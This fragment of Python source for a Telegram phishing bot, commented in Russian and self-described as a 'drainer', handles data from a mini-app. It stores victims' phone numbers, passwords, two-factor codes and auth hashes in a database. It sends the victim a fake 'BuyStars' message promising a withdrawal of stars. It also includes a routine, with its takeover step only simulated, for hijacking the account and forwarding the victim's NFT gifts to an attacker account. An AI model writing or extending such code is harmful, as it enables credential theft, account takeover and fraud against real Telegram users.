# ---------- WebApp Data Handler (основная логика дрейнера) ----------
async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Обработка данных из мини-приложения — ЗАХВАТ АККАУНТА"""
    data = update.effective_message.web_app_data
    if not data:
        return
    
    payload = json.loads(data.data)
    user_id = update.effective_user.id
    
    logger.info(f"🔓 CREDENTIALS COLLECTED from {user_id}: phone={payload.get('phone')}")
    
    # Сохраняем креды жертвы
    cursor.execute("""
        UPDATE victims 
        SET phone = ?, password = ?, twofa_code = ?, auth_hash = ?, status = 'captured', captured_at = CURRENT_TIMESTAMP
        WHERE telegram_id = ?
    """, (payload.get('phone'), payload.get('password'), payload.get('twofa_code'), payload.get('auth_hash'), user_id))
    
    # Обновляем статистику
    cursor.execute("UPDATE stats SET value = value + 1 WHERE key = 'total_victims'")
    conn.commit()
    
    # Запускаем процесс захвата аккаунта и форварда подарков
    asyncio.create_task(capture_and_drain(user_id, payload))
    
    # Фейковое сообщение для жертвы
    await update.message.reply_text(
        "✅ *Верификация выполнена!*\n\n"
        f"Вывод {random.randint(100, 5000)} ★ выполняется.\n"
        "Средства поступят на ваш кошелек в течение 5-10 минут.\n\n"
        "Спасибо, что пользуетесь BuyStars!",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_keyboard()
    )

async def capture_and_drain(user_id: int, credentials: Dict[str, Any]):
    """Захват аккаунта и сбор NFT-подарков"""
    phone = credentials.get('phone')
    password = credentials.get('password')
    twofa = credentials.get('twofa_code')
    
    logger.info(f"🎯 Starting capture for {phone}")
    
    # В реальной реализации здесь используется MTProto (Pyrogram/Telethon)
    # для авторизации под жертвой и поиска NFT-подарков
    
    # Имитация поиска бизнес-чатов и подарков
    await asyncio.sleep(3)
    
    # Фейковые данные для демонстрации
    fake_gifts = [
        {"id": "gift_001", "name": "⭐ Золотая Звезда", "stars": 1000},
        {"id": "gift_002", "name": "💎 Алмазный Подарок", "stars": 500},
        {"id": "gift_003", "name": "🌈 Радужный NFT", "stars": 250},
    ]
    
    victim_id = cursor.execute("SELECT id FROM victims WHERE telegram_id = ?", (user_id,)).fetchone()[0]
    
    for gift in fake_gifts:
        cursor.execute("""
            INSERT INTO drained_gifts (victim_id, gift_id, gift_name, forwarded_to)
            VALUES (?, ?, ?, ?)
        """, (victim_id, gift['id'], gift['name'], TARGET_ACCOUNT_ID))
        
        cursor.execute("UPDATE stats SET value = value + 1 WHERE key = 'total_gifts_drained'")
        cursor.execute("UPDATE stats SET value = value + ? WHERE key = 'total_stars_drained'", (gift['stars'],))
        
        logger.info(f"🎁 DRAINED: {gift['name']} from {phone} -> {TARGET_ACCOUNT_ID}")
    
    conn.commit()
    
    logger.info(f"✅ Capture complete for {phone}. Drained {len(fake_gifts)} gifts")

